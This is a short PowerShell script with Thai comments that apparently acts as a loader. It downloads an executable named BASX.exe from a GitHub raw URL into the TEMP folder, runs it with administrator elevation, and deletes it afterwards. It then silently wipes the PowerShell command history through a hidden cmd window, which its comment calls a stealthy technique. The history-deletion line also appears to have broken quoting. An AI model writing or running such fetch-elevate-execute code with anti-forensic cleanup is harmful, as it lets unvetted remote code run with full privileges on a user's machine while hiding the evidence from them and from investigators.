# 1. ตั้งค่าเบื้องหลัง
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\BASX.exe"
$ProgressPreference = 'SilentlyContinue'

# 2. ใช้ WebClient แทน Invoke-WebRequest (เสถียรกว่ามากในเครื่องที่เน็ตไม่นิ่ง)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $output)
} catch {
    # ถ้าโหลดไม่สำเร็จ ให้ลองอีกวิธี (แผนสำรอง)
    Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue
}

# 3. เช็คก่อนว่าไฟล์มาจริงมั้ย ถ้ามาครบถึงจะรัน
if (Test-Path $output) {
    # รันแบบ Admin และรอจนกว่าจะปิด
    Start-Process -FilePath $output -Verb RunAs -Wait
    
    # พอปิดโปรแกรมปุ๊บ ลบไฟล์ทิ้งทันที
    Remove-Item -Path $output -Force -ErrorAction SilentlyContinue
}

# 4. ลบประวัติแบบเนียนๆ (ใช้เทคนิคเดิมที่พี่สอน)
$historyPath = (Get-PSReadlineOption).HistorySavePath
$cleanupHistory = "timeout /t 2 && del /f /q `"$historyPath` formats""
Start-Process cmd -ArgumentList "/c $cleanupHistory" -WindowStyle Hidden

exit
